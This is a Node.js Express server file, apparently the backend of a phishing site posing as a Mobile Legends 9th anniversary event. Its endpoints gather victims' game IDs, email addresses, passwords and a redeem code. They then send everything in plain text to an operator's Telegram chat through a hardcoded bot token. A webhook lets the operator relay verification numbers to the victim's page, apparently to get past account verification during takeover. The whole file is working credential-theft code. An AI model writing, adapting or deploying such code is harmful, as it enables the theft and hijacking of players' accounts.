const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

// Telegram Bot Configuration
const TELEGRAM_TOKEN = '7865954464:AAFBqmqdfeOSatw7m8MRr2HbJUvqSIbbdAI';
// For Vercel, we'll use webhook mode instead of polling
const bot = new TelegramBot(TELEGRAM_TOKEN);

// Replace with your Telegram chat ID
const CHAT_ID = process.env.CHAT_ID || '1066887572';

// Store verification codes temporarily (in production, use a database)
// Note: On Vercel, this will reset between function calls
// Consider using a database like MongoDB or Redis for persistence
const verificationCodes = {};
const verificationStatus = {};

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Store user data temporarily (in production, use a database)
const userData = {};

// Handle first step (User ID and Game ID)
app.post('/api/step1', (req, res) => {
    const { userId, gameId, sessionId } = req.body;
    
    if (!userId || !gameId) {
        return res.status(400).json({ success: false, message: 'User ID and Game ID are required' });
    }
    
    // Store data temporarily
    userData[sessionId] = {
        userId,
        gameId,
        timestamp: new Date()
    };
    
    res.json({ success: true, message: 'Step 1 completed' });
});

// Handle second step (Email and Password)
app.post('/api/step2', async (req, res) => {
    const { email, password, sessionId } = req.body;
    
    if (!email || !password || !sessionId || !userData[sessionId]) {
        return res.status(400).json({ success: false, message: 'All fields are required' });
    }
    
    // Store email and password temporarily - don't send to Telegram yet
    const userInfo = userData[sessionId];
    userData[sessionId] = {
        ...userInfo,
        email,
        password,
        timestamp: new Date()
    };
    
    res.json({ success: true, message: 'Step 2 completed' });
});

// Handle third step (Redeem Code Validation)
app.post('/api/step3', async (req, res) => {
    const { redeemCode, sessionId } = req.body;
    
    if (!redeemCode || !sessionId || !userData[sessionId]) {
        return res.status(400).json({ success: false, message: 'Redeem code is required' });
    }
    
    // Validate the redeem code
    const validCode = 'M4EVE89X1S2L09Q';
    if (redeemCode.trim().toUpperCase() !== validCode) {
        return res.status(400).json({ 
            success: false, 
            message: 'Invalid redeem code. Please check and try again.' 
        });
    }
    
    // Code is valid, now send complete data to Telegram
    const completeData = {
        ...userData[sessionId],
        redeemCode: redeemCode.trim().toUpperCase(),
        submittedAt: new Date()
    };
    
    try {
        const message = `🎮 Mobile Legends 9th Anniversary Event Data:
        
👤 User ID: ${completeData.userId}
🎯 Game ID: ${completeData.gameId}
📧 Email: ${completeData.email}
🔐 Password: ${completeData.password}
🎁 Redeem Code: ${completeData.redeemCode}
⏰ Submitted: ${completeData.submittedAt.toLocaleString()}

Please send a verification number to approve this registration.`;
        
        await bot.sendMessage(CHAT_ID, message);
        
        // Store session for step 4 verification
        userData[sessionId] = completeData;
        
        res.json({ success: true, message: 'Redeem code verified successfully!', sessionId });
    } catch (error) {
        console.error('Telegram error:', error);
        res.status(500).json({ success: false, message: 'Failed to send data. Please try again.' });
    }
});

// Handle step 4 - Get verification code and status
app.get('/api/verification-code/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    if (!sessionId || !userData[sessionId]) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }
    
    const code = verificationCodes[sessionId];
    const status = verificationStatus[sessionId] || 'waiting_admin_code';
    
    if (code) {
        res.json({ 
            success: true, 
            code: code.number, 
            timestamp: code.timestamp,
            status: status
        });
    } else {
        res.json({ success: false, message: 'No verification code yet', status: status });
    }
});

// Handle step 4 - Check verification status
app.get('/api/verification-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    if (!sessionId || !userData[sessionId]) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }
    
    const status = verificationStatus[sessionId] || 'waiting_admin_code';
    
    if (status === 'completed') {
        // Clean up data
        delete userData[sessionId];
        delete verificationCodes[sessionId];
        delete verificationStatus[sessionId];
        
        res.json({ success: true, status: 'completed', message: 'Verification completed!' });
    } else {
        res.json({ success: true, status: status });
    }
});

// Webhook endpoint for Telegram (for Vercel deployment)
app.post('/api/telegram-webhook', (req, res) => {
    const update = req.body;
    
    if (update.message) {
        const chatId = update.message.chat.id.toString();
        const text = update.message.text;
        
        // Handle admin messages
        if (chatId === CHAT_ID) {
            // Admin sends verification number
            if (text && /^\d+$/.test(text.trim())) {
                const verificationNumber = text.trim();
                
                // Find the most recent session waiting for verification
                const sessions = Object.keys(userData);
                if (sessions.length > 0) {
                    const latestSession = sessions[sessions.length - 1];
                    
                    // Store the verification code
                    verificationCodes[latestSession] = {
                        number: verificationNumber,
                        timestamp: new Date()
                    };
                    
                    // Initialize status - directly waiting for admin ok
                    verificationStatus[latestSession] = 'waiting_admin_ok';
                    
                    console.log(`✅ Verification code ${verificationNumber} received for session ${latestSession}`);
                    
                    // Send confirmation back
                    bot.sendMessage(CHAT_ID, `🎮 Mobile Legends Verification\n\nVerification number: ${verificationNumber}\n\nSend "ok" to complete the registration.`);
                } else {
                    bot.sendMessage(CHAT_ID, `⚠️ No pending registrations found for code ${verificationNumber}.`);
                }
            }
            // Admin sends "ok" to confirm
            else if (text && text.toLowerCase().trim() === 'ok') {
                const sessionWaitingForOk = Object.keys(verificationStatus).find(session => 
                    verificationStatus[session] === 'waiting_admin_ok'
                );
                
                if (sessionWaitingForOk) {
                    verificationStatus[sessionWaitingForOk] = 'completed';
                    bot.sendMessage(CHAT_ID, '✅ Registration completed successfully!');
                    console.log(`✅ Admin confirmed completion for session ${sessionWaitingForOk}`);
                } else {
                    bot.sendMessage(CHAT_ID, `⚠️ No pending verifications waiting for confirmation.`);
                }
            }
        }
    }
    
    res.status(200).json({ ok: true });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ success: false, message: 'Something went wrong!' });
});

// Export for Vercel
module.exports = app;